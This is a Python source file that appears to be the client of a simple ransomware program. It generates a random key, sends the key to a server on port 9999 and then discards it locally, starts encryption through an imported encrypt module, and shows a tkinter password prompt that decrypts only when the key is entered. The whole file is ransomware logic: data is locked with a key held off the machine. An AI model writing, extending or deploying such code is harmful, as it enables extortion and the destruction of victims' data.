import os
import body
import encrypt
import decrypt
import random
import socket
import sys
import g2
import tkinter as tk
from threading import *
import threading
s=socket.socket()
try:
   host_ip = socket.gethostbyname('localhost')
except socket.gaierror:
     print ("there was an error resolving the host")
     sys.exit()
s.connect((host_ip,9999))
print(s.recv(1024).decode)

Key=''
def generateKey(size):
    chars = list("abcdefghijklmnopqrstuvwxyz1234567890=-+_*\|?><,.{]}[()")
    indexs = []
    for _ in range(size):
        indexs.append(random.randint(0, len(chars) - 1))
    return "".join(list(map(lambda x : chars[x], indexs)))

Key=generateKey(100)
s.send(Key.encode())
s.close()
def main2():
    encrypt.encryption(Key)

root=tk.Tk()
root.geometry("600x400")
passw_var=tk.StringVar()

def main():
    passw_label = tk.Label(root, text = 'Password', font = ('calibre',10,'bold'))
    passw_entry=tk.Entry(root, textvariable = passw_var, font = ('calibre',10,'normal'), show = '*')   
    sub_btn=tk.Button(root,text = 'Submit', command = submit)
    passw_label.grid(row=1,column=0)
    passw_entry.grid(row=1,column=1)
    sub_btn.grid(row=2,column=1)
    root.mainloop()
   
def submit():
        
    password=passw_var.get()
    if password == Key:
        decrypt.decryption(Key)
        root.destroy()
    else:
        passw_lab = tk.Label(root, text = 'WrongPassword', font = ('calibre',10,'bold'))
        passw_lab.grid(row=1,column=0)  
    passw_var.set("")

t1 = threading.Thread(target=main2)
t2 = threading.Thread(target=main)
t1.start()
t2.start()
t1.join()
t2.join()
print("Done!")